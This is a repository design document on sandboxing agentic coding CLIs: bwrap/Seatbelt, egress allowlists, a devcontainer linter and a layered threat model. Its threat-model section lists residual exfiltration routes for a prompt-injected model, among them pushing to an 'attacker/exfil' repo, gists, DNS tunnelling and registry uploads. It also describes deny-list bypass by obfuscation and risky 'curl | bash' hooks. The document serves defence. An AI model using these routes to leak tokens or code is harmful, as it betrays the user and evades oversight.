Sandbox Posture for Agentic CLIs

This doc describes the OS-level sandbox posture for the three agentic CLIs this
repo deploys (Claude Code, Codex CLI, Copilot CLI) across the three environments
this repo supports (hosts, local devcontainers, GitHub Codespaces).

The architecture is **three tiers, not one**: the right sandbox boundary in each
tier is different. Trying to use the same mechanism everywhere produced one
incompatibility after another. The tiered model is the simpler answer.

Three-tier posture
==================

| Tier                | Filesystem isolation | Network egress                                                  | Sandbox config file        |
|---------------------|----------------------|------------------------------------------------------------------|----------------------------|
| Host (macOS)        | Seatbelt             | `allowedDomains` (Claude Code) + macOS Seatbelt                  | `claude-code/settings.json` |
| Host (Linux/WSL2)   | bwrap                | `allowedDomains` (kernel-enforced via netns)                     | `claude-code/settings.json` |
| Local devcontainer  | container boundary   | Unrestricted by default; lint the spec via `bin/dc-audit.sh`     | `claude-code/settings.container.json` |
| Codespaces          | container boundary   | Same as local devcontainer                                       | `claude-code/settings.container.json` |

For hardened, unattended runs that need a hostname allowlist enforced
inside the container, see [`unattended/`](../unattended/README.md) --
the profile under [`.devcontainer/unattended/`](../.devcontainer/unattended/devcontainer.json)
ships a mitmproxy with an explicit hostname allowlist and per-request
audit log.

`install.sh` chooses which settings file to deploy to `~/.claude/settings.json`
based on `is_devcontainer()`: container variants in devcontainers and Codespaces,
host variants on macOS, Linux, and WSL2 hosts. Same pattern for Codex CLI
(`codex/config.toml` vs `codex/config.container.toml`).

What the sandbox does and doesn't gate
======================================

`sandbox.network.allowedDomains` only gates the **Bash tool**. Claude Code's
other tools have separate (and looser, by design) policies:

| Tool                       | Sandboxed?                              | Network policy                                                                                  |
|----------------------------|-----------------------------------------|-------------------------------------------------------------------------------------------------|
| Bash (`curl`, `npm install`, `git clone`, etc.) | Yes -- bwrap netns + proxy (Linux) / Seatbelt (macOS) | `sandbox.network.allowedDomains` -- proxy enforces hostname allowlist            |
| WebFetch                   | No -- runs in Claude Code's own process | `permissions` rules (`WebFetch` open / `WebFetch(domain:X)` narrow). Default in this repo: open. |
| WebSearch                  | No -- API call to `api.anthropic.com`   | `permissions` allow list; no per-domain gate (results return as text)                            |
| Read / Write / Edit        | Filesystem isolation only               | `permissions.deny[Read|Write|Edit]` glob list (credential blocklist)                             |
| Glob / Grep                | No network                              | n/a                                                                                              |

Practical consequence: a tight `allowedDomains` does **not** constrain Claude's
research. Looking up MDN, Stack Overflow, language docs, or arbitrary URLs
goes through WebFetch and bypasses the bash sandbox entirely. The trade-off
is intentional -- WebFetch returns text; a compromised bash subprocess can
exfiltrate, so bash gets the narrow gate.

The allowlist therefore only matters for operations that ask the *shell* to
reach out: package install, git clone/push, container pulls, toolchain
installers, `curl` for API testing.

### Host vs container scope difference

The "WebFetch is not gated" property above is specific to **hosts**. The
host sandbox enforces `allowedDomains` via a proxy that bwrap (Linux) or
Seatbelt (macOS) only attaches to bash subprocesses; Claude Code's own
process sits outside that boundary and reaches the network directly.

The hardened unattended profile takes a different approach: a mitmproxy
runs in the container with an explicit hostname allowlist, and
`HTTPS_PROXY` / `HTTP_PROXY` route all in-container traffic (including
Claude Code's own process, and therefore WebFetch and WebSearch) through
it. That gates the model's research too, which is intentional for the
unattended threat model. See [`unattended/`](../unattended/README.md).

| Layer / tier                                              | Gates bash?   | Gates WebFetch?           | Gates WebSearch?                                          |
|-----------------------------------------------------------|:-------------:|:-------------------------:|:---------------------------------------------------------:|
| Host `sandbox.network.allowedDomains` (bwrap/Seatbelt)    | yes           | **no** (out of bwrap)     | no                                                        |
| Unattended profile mitmproxy (`unattended/egress-allowlist.txt`) | yes    | **yes** (container-wide)  | yes -- but `api.anthropic.com` is on the default allowlist, so it works |
| `permissions.deny[Read|Write|Edit]` (Claude Code layer)   | n/a           | no                        | no                                                        |
| `permissions` allow/deny for `WebFetch(domain:X)`         | no            | yes (Claude Code layer)   | n/a                                                       |

So in the unattended profile, research *is* affected: a WebFetch to a
domain not on the allowlist fails at mitmproxy the same way a `curl`
from bash would. Adjust `unattended/egress-allowlist.txt` to add
research domains the agent should be allowed to reach. (Project-level
`settings.local.json` won't help here -- the proxy operates below
Claude Code's permission system.)

Extending the host allowlist
----------------------------

The default list covers the common agentic-coding bash surface:

- **Anthropic**: api/console/statsig.
- **SCM + GitHub releases**: github.com, api.github.com, raw + objects +
  codeload.githubusercontent.com, ghcr.io.
- **Package registries**: npmjs.org, yarnpkg.com, pypi.org +
  files.pythonhosted.org, crates.io + index/static.crates.io,
  proxy/sum.golang.org.
- **Doc sites**: MDN, Stack Overflow + *.stackexchange.com, language docs
  (Python, Node, Rust, Go, TypeScript), MS Learn, Apple Developer,
  Kubernetes, man7.org, linux.die.net.

What's intentionally **not** in the default global allowlist:

- **Project-specific deploy targets**: Vercel, Fly.io, Heroku, Netlify, AWS,
  GCP, Azure, your kubernetes API. These vary per project; keep additions
  in `.claude/settings.local.json` (not tracked by dotfiles).
- **Public Docker Hub** (`docker.io`, `registry-1.docker.io`): rarely needed
  by Claude itself; add per-project if testing pulls public images.
- **Toolchain installers** (`sh.rustup.rs`, `dl.google.com`, etc.): rare
  enough to handle case-by-case via the project-local extension point above.

To extend the host Claude Code sandbox in a project, copy the relevant
`allowedDomains` block into `.claude/settings.local.json` and merge -- Claude
Code settings precedence is managed > CLI > local > project > user, so a
project-local entry strictly adds to (doesn't replace) the global allowlist.
For unattended runs, edit `unattended/egress-allowlist.txt` to extend the
mitmproxy hostname allowlist (the file is read at container start).

Auto mode and the sandbox are independent layers
------------------------------------------------

A common question: does running Claude Code in auto-accept mode (or with
`--dangerously-skip-permissions`) bypass the bash sandbox? **No.** Permission
mode and the OS sandbox sit at different layers:

- **Permission mode** is a UX-layer behavior. It controls when Claude prompts
  you before invoking a tool. Auto-accept skips the prompt; bypass mode
  skips everything in the prompting pipeline.
- **The sandbox** is kernel-enforced. Every Bash subprocess runs inside
  bwrap (Linux/WSL2) or Seatbelt (macOS) regardless of how the tool call
  was approved. The kernel doesn't care whether Claude asked you first.

What auto-accept and bypass mode do **not** bypass:

| Layer                                              | Bypassed?  |
|----------------------------------------------------|:----------:|
| Interactive "allow tool X?" prompt                 | yes        |
| `permissions.deny[]` rules                         | **no**     |
| PreToolUse hooks (`pre-security.sh`, etc.)         | **no**     |
| OS sandbox (bwrap / Seatbelt)                      | **no**     |
| `sandbox.network.allowedDomains` (kernel-enforced) | **no**     |
| `sandbox.allowUnixSockets` (macOS path globs)      | **no**     |

So in auto mode on a host with `sandbox.enabled: true`:

- A bash subprocess that tries to reach a domain outside `allowedDomains`
  still fails (`curl: (6) Could not resolve host`).
- A read against `~/.ssh/id_ed25519` still hits the deny-list and the
  `pre-security.sh` hook.
- `Bash(sudo:*)`, `Bash(rm -rf:*)`, and the other hard-blocked patterns
  still reject.

What you *do* lose in auto mode is the human-in-the-loop check on
*ambiguous* cases -- anything that falls in the gap between
`permissions.allow` and `permissions.deny` gets auto-accepted, where in
interactive mode you'd be asked. The sandbox is your remaining backstop.

One caveat: `sandbox.failIfUnavailable: false` (the default in this repo's
config) means that if bwrap *itself* can't start (stripped kernel, missing
binary, Codespaces), Claude falls back to running bash without the
sandbox. That fallback is an *environment* condition, not a permission-mode
one -- it triggers regardless of auto vs. interactive mode. The deny-list
and pre-security hook still apply in that fallback.

Why three tiers
---------------

The original design tried to run bwrap *inside* devcontainers, then patched
around the friction:

- Claude Code's WSL2 detection (`/proc/sys/kernel/osrelease` contains "microsoft")
  fires inside Linux containers running on WSL2 hosts. bwrap then tries to bind
  Windows host paths (`/mnt/c`, Program Files, managed-settings) that do not
  exist inside the container. Workaround: pre-seed the paths from `install.sh`.
- Docker's default seccomp profile blocks the namespace-creation syscalls bwrap
  needs. Workaround: `--security-opt=seccomp=unconfined` in runArgs.
- The kernel additionally gates `CLONE_NEWNS` on `CAP_SYS_ADMIN`. Workaround:
  `--cap-add=SYS_ADMIN`.
- bwrap on Linux installs a seccomp filter that unconditionally blocks
  `socket(AF_UNIX, ...)`, breaking ssh-agent reachability for signed git commits.
  No setting bypasses this on Linux (issue [#44180](https://github.com/anthropics/claude-code/issues/44180)
  is the open feature request; `excludedCommands "git *"` does *not* work per
  [#10767](https://github.com/anthropics/claude-code/issues/10767),
  [#29274](https://github.com/anthropics/claude-code/issues/29274)).

Each workaround was correct in isolation, but the pattern was that container
config kept encoding *host-OS* knowledge. That dependency direction is wrong:
the container should not need to know what host it is running on.

The pivot: **the container is itself a kernel-enforced isolation primitive,
and bwrap inside a container is defense-in-depth with high maintenance cost.**
Drop bwrap inside containers, keep it on hosts where it has no leaky
abstractions. For attended use, the container boundary plus a linted
`devcontainer.json` is the security model. For unattended use, the
profile under `.devcontainer/unattended/` layers on mitmproxy for
egress enforcement; both are host-OS-blind.

Hosts
=====

Hosts run the full Claude Code Bash sandbox: `sandbox.enabled: true` in
`claude-code/settings.json`. Filesystem isolation is enforced by Seatbelt on
macOS and bubblewrap on Linux/WSL2; both are installed by `bootstrap/packages.sh`
on Linux (`bubblewrap` + `socat` packages) and built-in on macOS.

Network egress is enforced by `sandbox.network.allowedDomains` via a host-side
HTTP proxy. On Linux, bwrap unshares the network namespace and bridges via socat
into the proxy, so the policy is kernel-enforced for every bash subprocess. On
macOS, Seatbelt enforces a similar boundary.

SSH agent and signed commits
----------------------------

bwrap's default Linux profile installs a seccomp filter that blocks
`socket(AF_UNIX, ...)`. This breaks ssh-agent reachability from any sandboxed
bash command -- including `git commit` when commits are SSH-signed via the agent.

Status by host platform:

- **macOS**: `sandbox.network.allowUnixSockets` accepts a path glob. The dotfiles
  config narrowly allows the launchd-bridged ssh-agent path
  (`/private/tmp/com.apple.launchd.*/Listeners`). Signed commits in-session work.
- **Linux + WSL2**: no equivalent setting exists. Issue
  [#44180](https://github.com/anthropics/claude-code/issues/44180) tracks the
  upstream fix. The two SSH-signing variants behave differently inside the
  sandbox:
  - **File-based** (`user.signingkey` = path to `~/.ssh/id_ed25519.pub`):
    works. `ssh-keygen` derives the private key path by stripping `.pub`
    and reads the file directly -- no AF_UNIX socket, so the bwrap seccomp
    filter is irrelevant. `install.sh` falls back to this when no agent
    is reachable at install time.
  - **Agent-based** (`user.signingkey` = `"key::<literal-pubkey>"`):
    broken. ssh-keygen must contact `SSH_AUTH_SOCK`, which requires
    `socket(AF_UNIX, ...)`. `install.sh` prefers this when an agent is
    loaded at install time, so signing breaks for those users in-sandbox.
    Workaround: re-run `git config --global user.signingkey
    ~/.ssh/id_ed25519.pub` to switch to file-based, or run `git commit`
    in a separate terminal until upstream lands a Linux equivalent of
    `allowUnixSockets`.

Settings precedence (managed > CLI > local > project > user) means an
organization can enforce sandboxing for every developer via managed settings;
this repo only ships user-level config.

Local devcontainers
===================

Container = sandbox. `claude-code/settings.container.json` sets
`sandbox.enabled: false`, and Codex's `codex/config.container.toml` sets
`sandbox_mode = "danger-full-access"`. No bwrap inside, no host-OS workarounds
in devcontainer.json.

What that means in practice:

- `~/.ssh`, `~/.aws`, etc. on the host are unreachable from inside the
  container (Docker's filesystem boundary). The deny-glob entries in
  `permissions.deny[]` still gate Claude Code's own file tools against in-project
  secret patterns (`**/*.pem`, `**/credentials*`, `.env*`).
- ssh-agent is reachable normally (no seccomp filter installed), so signed
  commits work in-session.
- Network egress is unrestricted by default. The container itself has the
  Docker bridge's view of the network. The right place to constrain a
  container's network reach is **the spec, not a runtime allowlist**:
  pin the image, drop capabilities, refuse risky bind mounts. Run
  `bin/dc-audit.sh` against every project's `devcontainer.json` (it has
  rules for `--privileged`, `--cap-add=SYS_ADMIN`,
  `--security-opt=seccomp=unconfined`, `docker.sock` mounts, and
  credential-directory mounts).

For unattended runs that need a hostname-level egress allowlist
enforced *inside* the container, use the hardened profile under
[`.devcontainer/unattended/`](../.devcontainer/unattended/devcontainer.json) --
it ships mitmproxy + `unattended/egress-allowlist.txt` with a
per-request audit log. The mitmproxy approach is name-based (no DNS
pinning brittleness) and does not require `NET_ADMIN`.

Persistence model
=================

Single shared Docker volume + symlinks. A project devcontainer.json declares
one mount line:

```jsonc
"mounts": [
  "source=${devcontainerId}-state,target=/home/vscode/.dotfiles-state,type=volume"
]
```

`install.sh` creates `~/.dotfiles-state/` and symlinks `~/.claude`, `~/.codex`,
`~/.copilot` into subdirectories of it. Symlinks everywhere -- on hosts and in
containers -- because the bwrap-mount-over-symlink-into-volume-submount conflict
that previously forced "copy in containers" no longer exists (no bwrap inside).

Membership rule: dotfiles persists state for what dotfiles installs. Currently
that's Claude Code, Codex CLI, and Copilot CLI. Other tools (gh, kubectl, docker)
are out of scope -- projects own their own persistence.

Codespaces relies on platform-level `/home/vscode` persistence across stop/start
(rebuilds re-auth, accepted). The dotfiles symlink layout still works; just no
explicit volume mount.

Ownership normalization
-----------------------

Docker creates a fresh named volume root-owned. The mount happens during
container start, *before* `postCreateCommand` runs `install.sh`. `install.sh`
detects a root-owned `~/.dotfiles-state` and `sudo chown` recursively before the
symlinks are created. Idempotent: once user-owned, the volume stays that way
across rebuilds.

Option H: devcontainer Feature (future)
----------------------------------------

The single mount line in each project devcontainer.json is the minimum coupling
mathematically achievable without a separate distribution artifact. To eliminate
even that, publish the dotfiles install as a devcontainer Feature on GHCR. The
spec supports `mounts` with `${devcontainerId}` substitution (the
docker-in-docker feature uses this exact pattern), so a Feature could declare
both the mount and the install command. Project devcontainer.json shrinks to:

```jsonc
"features": {
  "ghcr.io/iggycoloma/dotfiles-agent-tools:1": {}
}
```

Trade-off: publishing pipeline, versioning discipline, OCI artifact maintenance.
Defer until the one-line coupling becomes annoying or there's a second consumer.

Devcontainer.json linter
========================

`bin/dc-audit.sh` is a rubric-driven, security-focused linter that scans
devcontainer.json files for patterns that would punch holes in the container
boundary. The rubric lives in `unattended/devcontainer-rubric.json`; rules are
profile-tagged (`attended` or `unattended`). Wired into `make lint-devcontainers`.
Checks include:

- **Risky mounts**: `docker.sock`, ssh-agent forwarding, `~/.ssh`, `~/.aws`,
  `~/.gnupg`, `~/.azure`, `~/.config/gh`, `~/.config/gcloud`, `~/.kube`,
  `~/.docker`. Source-side substring match against `source=...` entries.
- **Credential env pass-through**: `AWS_*`, `GCP_*`/`GOOGLE_APPLICATION_*`,
  `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GH_TOKEN`, `GITHUB_TOKEN`, `NPM_TOKEN`
  in containerEnv or remoteEnv.
- **Public port forwards**: forwardPorts entries that explicitly bind 0.0.0.0.

Advisory by default. Pass `--strict` to exit 1 on any warning (suitable for CI).
The repo's `unattended` profile intentionally passes `GH_TOKEN` for the agentic
ralph harness; that warning is expected.

Settings variant drift
----------------------

`bin/settings-drift.sh` is the companion that verifies host and container
settings variants stay in sync on every non-sandbox key. The drift check
lives in its own tool (not the rubric) because it's a two-file comparison,
not a per-devcontainer.json rule. Wired into `make lint` via the
`lint-settings-drift` target so every CI lint catches drift.

Checks:

- `claude-code/settings.json` vs `settings.container.json`, ignoring `.sandbox`.
- `codex/config.toml` vs `codex/config.container.toml`, ignoring `.sandbox_mode`.

Comparison is canonical: JSON keys are sorted (`jq -S`), TOML is normalized
through JSON (`yq -p toml -o json | jq -S`). Order and whitespace are not
drift; structural difference is. `--json` emits JSONL findings for CI consumption.

Tool-specific notes
===================

Claude Code
-----------

Host vs container variant lives at `claude-code/settings.json` and
`claude-code/settings.container.json`. Both files mirror each other on
`permissions`, `hooks`, `statusLine`, `env`, etc. Only the `sandbox` block
differs:

- Host: `sandbox.enabled: true`, full filesystem/network config.
- Container: `sandbox.enabled: false`, nothing else under sandbox.

The `permissions.deny[Read|Write|Edit]` glob list applies in both variants --
that gates Claude Code's own file tools, independent of the OS sandbox. The
in-project secret-pattern globs (`**/*.pem`, `**/credentials*`, `.env*`) still
catch interpreter bypasses there.

Codex CLI
---------

Same pattern: `codex/config.toml` (host) and `codex/config.container.toml`
(container). The host variant uses `sandbox_mode = "workspace-write"`; the
container variant uses `sandbox_mode = "danger-full-access"` because the
container is the boundary. Approval policy stays `on-request` in both -- the
human-in-the-loop gate is independent of sandbox mode.

Copilot CLI
-----------

Copilot CLI has no OS-level sandbox of its own. The container boundary is the
only isolation layer in devcontainers. On hosts, Copilot inherits the user's
process environment with no enforcement beyond the `--deny-tool` CLI flag
(which has no persistent equivalent). The dotfiles ship `copilot-instructions.md`
but do not pretend to enforce a sandbox.

Codespaces graceful degradation
================================

Codespaces' Azure-hosted kernel disallows the unprivileged user namespaces bwrap
needs, so bwrap cannot start there. `failIfUnavailable: false` in the host
settings lets Claude Code fall back to unsandboxed mode rather than failing
startup -- but in Codespaces we use the *container* variant settings anyway
(`is_devcontainer()` returns true for Codespaces), so the fallback path is not
the primary concern. The container's process and filesystem isolation remain.

Codespaces' container boundary is the security model. For projects that
need per-hostname egress enforcement inside a Codespace, use the
`.devcontainer/unattended/` profile as the starting point -- mitmproxy
runs entirely in userspace and doesn't depend on the base image
shipping iptables.

Inside a devcontainer
======================

`install.sh` detects the container via `is_devcontainer()`, which checks the
`REMOTE_CONTAINERS` and `CODESPACES` env vars first and falls back to the
`/.dockerenv` sentinel that Docker creates at container start (so plain
`docker run` shells and devcontainers built without the VS Code remote helper
exporting the env var still resolve correctly). Then:

1. Deploys `claude-code/settings.container.json` over `~/.claude/settings.json`.
   On hosts this would be a symlink to the source file; in containers it is a
   copy (avoiding a symlink dependency that could break if the source repo is
   not present in the container).
2. Deploys `codex/config.container.toml` over `~/.codex/config.toml` as a
   managed copy, then appends the local absolute notify hook path. This
   intentionally overwrites a persisted in-container config so a stale host
   `sandbox_mode` cannot survive rebuilds. Hosts also use a managed copy for
   Codex config so notify wiring never dirties tracked source TOML.
3. Deploys shared Claude/Codex guardrail hook implementations to
   `~/.agent-hooks/`; per-tool hook directories contain wrappers.
4. Wires `~/.claude`, `~/.codex`, `~/.copilot` as symlinks under
   `~/.dotfiles-state/` (when the volume mount is present), or as plain real
   directories (when it is not).
5. Normalizes ownership of `~/.dotfiles-state/` if root-owned (first-mount fix).

The container does not install `bubblewrap` or `socat` -- those are skipped in
`bootstrap/packages.sh` when `is_devcontainer()` is true.

Limitations and known gaps
==========================

- **Linux ssh-agent-based signed commits**: blocked by the unconditional
  AF_UNIX seccomp filter. Tracked at issue
  [#44180](https://github.com/anthropics/claude-code/issues/44180).
  File-based SSH signing works in-sandbox (see "SSH agent and signed
  commits" above for how to switch); agent-based signing needs a separate
  terminal until upstream lands a Linux `allowUnixSockets` equivalent.
- **Host network proxy and TLS**: the built-in proxy enforces by hostname
  without TLS termination. Broad allowedDomains entries (e.g. `github.com`)
  can be domain-fronted by attacker code running inside the sandbox. Threat
  models requiring TLS-aware filtering need a custom proxy.
- **Egress allowlists narrow, do not close, the exfil channel**: even with
  the unattended mitmproxy enforcing a hostname allowlist, attacker code
  can dial allowed destinations (e.g. push to a controlled github.com
  repo). The allowlist narrows the channel; outer-ring controls
  (credential scoping, deny-list) are what limit blast radius.
- **Settings file drift**: `claude-code/settings.json` and
  `claude-code/settings.container.json` are two physical files maintained in
  parallel. The linter's drift check enforces sync on non-sandbox keys.
  Adding a key to one without the other is a `make lint` warning.

Threat model and security recommendations
=========================================

The sandbox + permission system is the *innermost* of several layers.
Picking the right defaults means understanding all of them and knowing
which one each control actually protects.

This section is opinionated. As of early 2026 there is no consensus
best practice for agentic-coding sandboxes; this is the maintainer's
reading of OWASP LLM Top 10, Anthropic's published threat modeling,
and adjacent security research, applied to the way this repo is
actually used.

Outer ring: `devcontainer.json` is the trust root
-------------------------------------------------

**The most important security control for a devcontainer is what's in
`devcontainer.json` itself.** Mounts, `runArgs`, env-var forwarding,
and image/feature pinning decide the blast radius *before* any
in-container control runs. Egress filtering is the last layer of a
four-layer onion. A "secure" iptables setup on a devcontainer that
mounts `docker.sock` is security theater.

Common footguns -- each one bypasses every layer below it:

| In `devcontainer.json`                                                                | Why it's an exfil risk                                                                                                                                       |
|---------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `mounts: [..."source=/var/run/docker.sock"...]`                                       | In-container process can spawn sibling containers as `--privileged`, mount host filesystem, exfiltrate the host. Effectively pwns the host.                  |
| `mounts: [..."source=${localEnv:HOME}/.ssh"...]`                                      | Bind-mounts your private SSH keys into the container. Long-lived. Highest-value cred most developers have.                                                   |
| SSH agent socket forwarding (mount or `SSH_AUTH_SOCK` env)                            | Container processes can sign anything as you, including pushing to *any* repo your keys can write.                                                           |
| `mounts` of `~/.aws`, `~/.gnupg`, `~/.azure`, `~/.config/gh`, `~/.config/gcloud`, `~/.kube`, `~/.docker` | Cloud-provider credentials and tool tokens, usually long-lived. Each one bypasses every protection layer below it.                                |
| `runArgs: ["--privileged"]` or `--cap-add=SYS_ADMIN`                                  | Container can mount host filesystems, manipulate namespaces, escape isolation.                                                                                |
| `runArgs: ["--security-opt=seccomp=unconfined"]`                                      | Lifts the seccomp filter that blocks ~50 dangerous syscalls. Combined with capability adds, gets bad fast.                                                    |
| `containerEnv` / `remoteEnv` forwarding `${localEnv:AWS_*}`, `GH_TOKEN`, `ANTHROPIC_API_KEY`, `NPM_TOKEN`, `OPENAI_API_KEY` | Forwards host secrets as env vars. Visible in `/proc/PID/environ`, inherited by every subprocess.                                       |
| Unpinned `image` (no `@sha256:...`) like `:debian` or `:latest`                       | The image you build on can change under you; a compromised upstream lands in your dev environment.                                                            |
| Unpinned `features: { "ghcr.io/.../docker-in-docker:1": {} }`                         | Each feature is arbitrary code from an OCI registry executed during build with elevated privileges. Pin to digest.                                            |
| `forwardPorts` bound to `0.0.0.0`                                                     | Container services exposed on all interfaces, including hostile networks.                                                                                     |
| `postCreateCommand: "curl ... \| bash"`                                               | Pulls and executes arbitrary code at build time. Trust chain depends on the upstream URL.                                                                     |

This is exactly the surface [`bin/dc-audit.sh`](../bin/dc-audit.sh)
audits. Run it against your project's `devcontainer.json` *before*
worrying about egress filtering. For hardened profiles, pass `--strict`
to fail on any warning:

```bash
bin/dc-audit.sh --strict --profile unattended .devcontainer/your-profile/devcontainer.json
```

Inner ring: what lives in the container that the model could exfil
------------------------------------------------------------------

A common intuition trap is "the creds are on the host; the container
can't reach them." That's only half right. Excluded by this repo's
design: host `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.azure`, `~/.config/gcloud`,
`~/.kube`, `~/.docker`. The dc-audit rubric blocks bind-mounting them.

**Inside** the container, in the persisted state volume, you typically have:

- **`~/.config/gh/`** -- the GitHub CLI's stored auth. Usually a
  long-lived classic PAT or OAuth user-to-server token. **The
  highest-value in-container cred for most developers.** It can push
  code to any repo it has write access to, read all private repos it
  can read, and call the GitHub API with your identity.
- **`~/.claude/`**, **`~/.codex/`**, **`~/.copilot/`** -- OAuth /
  session tokens for the agentic CLIs. Attacker with these can run
  Claude / Codex / Copilot as you, see your conversations, accrue
  charges to your account.
- **Atuin shell history** -- can include sensitive command output
  fragments depending on what you ran.
- **Forwarded env vars** (`containerEnv` / `remoteEnv`) -- visible to
  every process in the container via `/proc/PID/environ`.
- **Workspace source code** -- whether that matters is project-specific.

For unattended profiles specifically, prefer fine-grained,
single-repo, short-lived GitHub tokens (`GH_TOKEN_UNATTENDED`) over
the omnibus token `gh auth login` writes. The unattended profile
already does this.

The four protective layers, outer to inner
------------------------------------------

| Layer                                                                  | Protects against                                                          | Bypassable how                                                                                                                                                  |
|------------------------------------------------------------------------|---------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Hardened `devcontainer.json`** (run `bin/dc-audit.sh`)               | The worst exfil vectors before they exist                                 | If you skip dc-audit and leave `docker.sock` mounted, every layer below is moot                                                                                |
| **Container boundary**                                                 | Compromise of the *host* from inside the container                        | Doesn't protect the container's *own* contents                                                                                                                  |
| **Claude Code `permissions.deny[]` + `pre-security.sh` hook**          | Direct cred reads (`Read(~/.config/gh/**)`) and dangerous bash via Claude | Creative obfuscation (`xxd`, `base64`); indirect access via tools the model is allowed to use (`gh api`, `git push`)                                            |
| **Egress allowlist** (unattended profile mitmproxy + `unattended/egress-allowlist.txt`) | Exfil to *attacker-controlled* domains                  | Allowed domains can be misused (see "residual exfil paths" below); see also the egress-allowlist limitation in [Limitations and known gaps](#limitations-and-known-gaps) |

Residual exfil paths even with all four layers tight
----------------------------------------------------

The allowlist narrows the channel; it does not close it. A prompt-injected
model with read access to your GH token and bash access can still:

- `gh repo create attacker/exfil --private && git push` -- `github.com`
  is on the allowlist; the token has write access; you cannot tell
  legitimate pushes from exfil pushes at the network layer.
- `gh api -X POST /gists` posting source to a public gist.
- DNS exfiltration -- DNS is open; encode data in subdomain lookups.
- `npm publish` / `pypi upload` / `docker push` -- any allowed registry
  that accepts user-uploaded artifacts.

This is the central reason **the outer layers matter more than the
egress allowlist**: limit credential scope and you limit blast radius
even when the model is hijacked.

Opinionated recommendation by user profile
-------------------------------------------

| Profile                                  | Devcontainer.json   | Deny-list + hook | Egress allowlist                                                  | Notes                                                                                                                                                                                                                                                                |
|------------------------------------------|---------------------|------------------|-------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Hobbyist / personal projects**         | dc-audit clean      | on (default)     | **skip**                                                          | Container boundary + linted spec + permissions + human-in-the-loop are enough. A runtime egress allowlist on top breaks WebFetch research and the residual exfil paths survive it anyway. The friction isn't worth the marginal protection.                          |
| **Sensitive code or production-grade tokens** | dc-audit `--strict` | on (default) | **start from `.devcontainer/unattended/`**                        | If you want a network policy inside the container, copy the unattended profile -- it ships mitmproxy + `unattended/egress-allowlist.txt` and an audit log, with no `NET_ADMIN` or IP-pinning brittleness. Scope the GitHub token to specific repos.                  |
| **Unattended / agentic loops**           | use `.devcontainer/unattended/` as reference | on (default) | mitmproxy + `unattended/egress-allowlist.txt`               | The unattended profile demonstrates all four layers done right: no `~/.ssh`, no `docker.sock`, pinned image, `--cap-drop=ALL`, `--security-opt=no-new-privileges`, short-lived `GH_TOKEN_UNATTENDED`, mitmproxy egress with audit log. Crib from it; don't rebuild. |

Industry context
----------------

There is no settled best practice for agentic-coding sandboxes as of
early 2026. The defensive playbook from OWASP LLM Top 10, Anthropic's
published threat modeling, and adjacent sources:

1. Containerize. (This repo does.)
2. Limit credential scope -- fine-grained, single-repo, short-lived
   tokens where possible.
3. Approval-required for destructive operations (pre-security hook +
   deny-list).
4. Egress allowlist for high-stakes / unattended work; relaxed for
   interactive everyday work where the user is in the loop.
5. Audit logging (the unattended profile's mitmproxy log).

CVEs and updates
================

Keep Claude Code auto-updated. Sandbox-relevant CVEs (e.g. CVE-2026-25725,
settings.json injection sandbox-escape) have shipped fixes; auto-update is
the path to consume them.

Reference
=========

- [Configure the sandboxed Bash tool (Claude Code docs)](https://code.claude.com/docs/en/sandboxing)
- [Dev Container Features reference](https://containers.dev/implementors/features/)
- [docker-in-docker feature (example of ${devcontainerId} in feature mounts)](https://github.com/devcontainers/features/blob/main/src/docker-in-docker/devcontainer-feature.json)
- [@anthropic-ai/sandbox-runtime (npm package, optional)](https://www.npmjs.com/package/@anthropic-ai/sandbox-runtime)
